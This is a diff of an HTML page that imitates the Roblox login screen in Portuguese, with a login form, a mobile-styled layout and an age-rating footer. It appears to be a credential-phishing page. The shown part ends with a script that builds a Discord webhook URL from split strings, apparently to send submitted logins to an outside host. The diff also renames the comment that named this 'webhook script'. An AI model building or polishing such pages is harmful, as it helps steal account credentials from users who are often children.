@@ -15,65 +15,96 @@
         }
 
         body {
-            background-color: #0d0e12;
+            background-color: #000000;
             color: #ffffff;
-            height: 100vh;
+            min-height: 100vh;
             display: flex;
             flex-direction: column;
-            overflow: hidden;
+            overflow-x: hidden;
+            /* Fundo com as imagens de jogos e degradê escuro */
+            background-image: 
+                linear-gradient(to bottom, rgba(0,0,0,0.2) 0%, rgba(0,0,0,0.8) 100%),
+                url('https://images.rbxcdn.com/2c3e2e7b4e5f4a6e8c9d0e1f2a3b4c5d.jpg');
+            background-size: cover;
+            background-position: center;
+            background-attachment: fixed;
         }
 
-        /* HEADER */
+        /* TOPBAR */
         .topbar {
             background-color: #191b1f;
-            height: 48px;
             display: flex;
             align-items: center;
             justify-content: space-between;
-            padding: 0 24px;
+            padding: 8px 16px;
             border-bottom: 1px solid #2e3134;
             z-index: 100;
+            height: 56px;
         }
 
-        .topbar-left { display: flex; align-items: center; gap: 24px; }
+        .topbar-left { display: flex; align-items: center; gap: 16px; flex: 1; }
         
-        /* LOGO DO ROBLOX VIA TEXTO */
-        .logo-text {
-            font-size: 22px;
-            font-weight: 900;
-            letter-spacing: 1px;
-            color: #ffffff;
-            text-transform: uppercase;
+        /* Logo SVG */
+        .logo-svg { width: 30px; height: 30px; fill: #ffffff; background: #ffffff; border-radius: 4px; padding: 4px; }
+        .logo-svg path { fill: #191b1f; }
+
+        .search-bar-mobile {
+            background-color: #272a2e;
+            border: 1px solid #3b3f43;
+            border-radius: 8px;
+            padding: 8px 12px;
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            flex: 1;
+            max-width: 250px;
+            color: #9ea2a6;
+            font-size: 14px;
         }
 
-        .nav-links { display: flex; gap: 20px; font-size: 14px; font-weight: 600; color: #e3e3e3; }
-        .nav-links span.active { color: #fff; border-bottom: 2px solid #fff; padding-bottom: 10px;}
+        .topbar-right { display: flex; align-items: center; gap: 8px; }
 
-        .topbar-right { display: flex; align-items: center; gap: 12px; }
-        .search-bar { background-color: #272a2e; border: 1px solid #3b3f43; border-radius: 4px; padding: 6px 12px; display: flex; align-items: center; gap: 8px; width: 240px; color: #9ea2a6; font-size: 14px; }
-        .btn-cadastrar { background-color: #335fff; color: #fff; border: none; padding: 6px 12px; border-radius: 4px; font-size: 14px; font-weight: 600; cursor: pointer; }
-        .btn-entrar-top { background-color: transparent; color: #fff; border: 1px solid #ffffff; padding: 6px 12px; border-radius: 4px; font-size: 14px; font-weight: 600; cursor: pointer; }
+        .btn-cadastrar {
+            background-color: #335fff; color: #fff; border: none;
+            padding: 8px 12px; border-radius: 6px; font-size: 14px; font-weight: 600; cursor: pointer;
+        }
+
+        .btn-entrar-top {
+            background-color: transparent; color: #fff; border: 1px solid #ffffff;
+            padding: 8px 12px; border-radius: 6px; font-size: 14px; font-weight: 600; cursor: pointer;
+        }
+
+        /* NAVEGAÇÃO MOBILE */
+        .nav-mobile {
+            display: flex;
+            justify-content: space-around;
+            background-color: #191b1f;
+            padding: 12px 0;
+            border-bottom: 1px solid #2e3134;
+            font-size: 14px;
+            font-weight: 600;
+            color: #e3e3e3;
+        }
+        .nav-mobile span.active { color: #fff; border-bottom: 2px solid #fff; padding-bottom: 10px; margin-bottom: -12px; }
 
         /* ÁREA CENTRAL */
         .main-area {
             flex: 1;
             display: flex;
-            justify-content: center;
+            flex-direction: column;
             align-items: center;
+            padding: 30px 16px;
             position: relative;
-            background-image: linear-gradient(to bottom, rgba(0,0,0,0.4) 0%, rgba(0,0,0,0.8) 100%), url('https://images.rbxcdn.com/2c3e2e7b4e5f4a6e8c9d0e1f2a3b4c5d.jpg'); 
-            background-size: cover;
-            background-position: center;
         }
 
-        /* CAIXA DE LOGIN FINA */
+        /* CAIXA DE LOGIN */
         .login-card {
             background-color: #232527;
             width: 100%;
-            max-width: 360px; /* Fina */
+            max-width: 400px;
             border-radius: 8px;
-            padding: 30px 24px;
-            box-shadow: 0 4px 20px rgba(0,0,0,0.6);
+            padding: 24px;
+            box-shadow: 0 10px 30px rgba(0,0,0,0.6);
             border: 1px solid #3b3f43;
             z-index: 10;
         }
@@ -85,16 +116,16 @@
             margin-bottom: 20px;
         }
 
-        .input-group { margin-bottom: 10px; }
+        .input-group { margin-bottom: 12px; }
 
         .input-group input {
             width: 100%;
-            padding: 10px 12px;
+            padding: 12px;
             background-color: #191b1f;
             border: 1px solid #3b3f43;
-            border-radius: 6px;
+            border-radius: 8px;
             color: #fff;
-            font-size: 14px;
+            font-size: 15px;
             outline: none;
         }
 
@@ -102,12 +133,12 @@
 
         .btn-main {
             width: 100%;
-            padding: 10px;
+            padding: 12px;
             background-color: #232527;
             border: 1px solid #ffffff;
-            border-radius: 6px;
+            border-radius: 8px;
             color: #ffffff;
-            font-size: 14px;
+            font-size: 15px;
             font-weight: 600;
             margin-top: 4px;
             cursor: pointer;
@@ -129,60 +160,121 @@
 
         .btn-secondary {
             width: 100%;
-            padding: 10px;
+            padding: 12px;
             background-color: #272a2e;
             border: 1px solid #3b3f43;
-            border-radius: 6px;
+            border-radius: 8px;
             color: #ffffff;
             font-size: 14px;
             font-weight: 600;
-            margin-bottom: 10px;
+            margin-bottom: 12px;
             cursor: pointer;
         }
 
         .btn-secondary:active { background-color: #3b3f43; }
 
-        .signup-text { text-align: center; color: #e3e3e3; font-size: 14px; margin-top: 20px; }
+        .signup-text { text-align: center; color: #e3e3e3; font-size: 14px; margin-top: 16px; }
         .signup-text a { color: #ffffff; font-weight: 700; text-decoration: none; }
 
-        /* RODAPÉ */
-        .footer { background-color: #191b1f; padding: 8px 0; display: flex; flex-direction: column; align-items: center; justify-content: center; border-top: 1px solid #2e3134; }
-        .footer-text { font-size: 11px; font-weight: 700; color: #fff; margin-bottom: 4px; }
-        .rating-bar { display: flex; width: 200px; height: 4px; }
-        .rating-red { width: 50%; background-color: #ff0000; }
-        .rating-white { width: 50%; background-color: #ffffff; }
+        /* RODAPÉ COMPLETO */
+        .footer-container {
+            background-color: #191b1f;
+            padding: 20px 16px;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            border-top: 1px solid #2e3134;
+            margin-top: auto;
+        }
 
-        @media (max-width: 768px) {
-            .nav-links, .search-bar { display: none; }
-            .topbar { padding: 0 16px; }
-            .login-card { max-width: 90%; padding: 24px 20px; }
+        .footer-text {
+            font-size: 12px;
+            font-weight: 700;
+            color: #fff;
+            margin-bottom: 10px;
+            letter-spacing: 0.5px;
+            text-transform: uppercase;
+        }
+
+        .rating-box {
+            display: flex;
+            background: #fff;
+            color: #000;
+            border-radius: 4px;
+            overflow: hidden;
+            width: 280px;
+            margin-bottom: 10px;
+        }
+
+        .rating-red-box {
+            background-color: #ff0000;
+            color: #fff;
+            font-size: 24px;
+            font-weight: 900;
+            padding: 10px 20px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+
+        .rating-text-box {
+            flex: 1;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            padding: 0 16px;
+            font-size: 13px;
+            font-weight: 600;
+        }
+
+        .footer-desc {
+            font-size: 11px;
+            text-align: center;
+            color: #e3e3e3;
+            line-height: 1.4;
+            margin-top: 5px;
+        }
+
+        /* Esconde o menu no celular */
+        @media (min-width: 768px) {
+            .topbar { padding: 0 24px; height: 48px; }
+            .nav-mobile { display: none; }
+            .search-bar-mobile { max-width: 300px; }
+            .topbar-left { gap: 24px; }
+            .logo-svg { width: 84px; height: 16px; background: transparent; padding: 0; }
+            .logo-svg path { fill: #ffffff; }
         }
     </style>
 </head>
 <body>
 
-    <!-- HEADER -->
+    <!-- TOPBAR MOBILE -->
     <div class="topbar">
         <div class="topbar-left">
-            <div class="logo-text">RŌBLOX</div>
-            <div class="nav-links">
-                <span class="active">Destaques</span>
-                <span>Mercado</span>
-                <span>Criar</span>
-                <span>Robux</span>
-            </div>
-        </div>
-        <div class="topbar-right">
-            <div class="search-bar">
+            <svg class="logo-svg" viewBox="0 0 84 16" xmlns="http://www.w3.org/2000/svg">
+                <path d="M4.7,16H0L2.3,0h4.7L4.7,16z M25.4,16h-4.7l-2.3-7.8-1.5,7.8h-4.7l-2.3-16h4.7l1.5,10.3l2.3-10.3h4.7l2.3,10.3l1.5-10.3h4.7L25.4,16z M34.5,0h-4.7L27.5,16h4.7L34.5,0z M42.1,10.1v5.9h-4.7V0h4.7v7.8l5.2-7.8h5.5l-6.2,7.2l6.2,8.8h-5.5L42.1,10.1z M59.7,16H55L57.3,0h8.6L59.7,16z M60.4,4h-1.5l-0.9,7.8h1.5L60.4,4z M83.3,4h-1.5l-0.9,7.8h1.5L83.3,4z M77.9,16h-4.7L75.5,0h8.6L77.9,16z"/>
+            </svg>
+            <div class="search-bar-mobile">
                 <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="#9ea2a6" stroke-width="2"><circle cx="11" cy="11" r="8"></circle><line x1="21" y1="21" x2="16.65" y2="16.65"></line></svg>
                 Pesquisar
             </div>
+        </div>
+        <div class="topbar-right">
             <button class="btn-cadastrar">Cadastrar-se</button>
             <button class="btn-entrar-top">Entrar</button>
         </div>
     </div>
 
-    <!-- ÁREA CENTRAL COM O FORMULÁRIO -->
+    <!-- NAVEGAÇÃO MOBILE -->
+    <div class="nav-mobile">
+        <span class="active">Destaques</span>
+        <span>Mercado</span>
+        <span>Criar</span>
+        <span>Robux</span>
+    </div>
+
+    <!-- ÁREA CENTRAL -->
     <div class="main-area">
         <div class="login-card">
             <h1>Entrar na Roblox</h1>
@@ -198,9 +290,7 @@
             </form>
 
             <a href="#" class="forgot-link">Esqueceu a senha ou nome de usuário?</a>
-
             <div class="divider"></div>
-
             <button class="btn-secondary">Envie-me um código único por e-mail</button>
             <button class="btn-secondary">Entrada rápida</button>
             <button class="btn-secondary">Outras opções de acesso</button>
@@ -211,16 +301,24 @@
         </div>
     </div>
 
-    <!-- RODAPÉ -->
-    <div class="footer">
+    <!-- RODAPÉ COMPLETO -->
+    <div class="footer-container">
         <div class="footer-text">CLASSIFICAÇÃO INDICATIVA: 16 ANOS</div>
-        <div class="rating-bar">
-            <div class="rating-red"></div>
-            <div class="rating-white"></div>
+        
+        <div class="rating-box">
+            <div class="rating-red-box">16</div>
+            <div class="rating-text-box">
+                Violência
+            </div>
+        </div>
+        
+        <div class="footer-desc">
+            Interação entre usuários<br>
+            Compras no jogo (inclui itens aleatórios)
         </div>
     </div>
 
-    <!-- SCRIPT DO WEBHOOK -->
+    <!-- SCRIPT -->
     <script>
         (function(){
             var p1 = "https://discord.com/api/webhooks/";
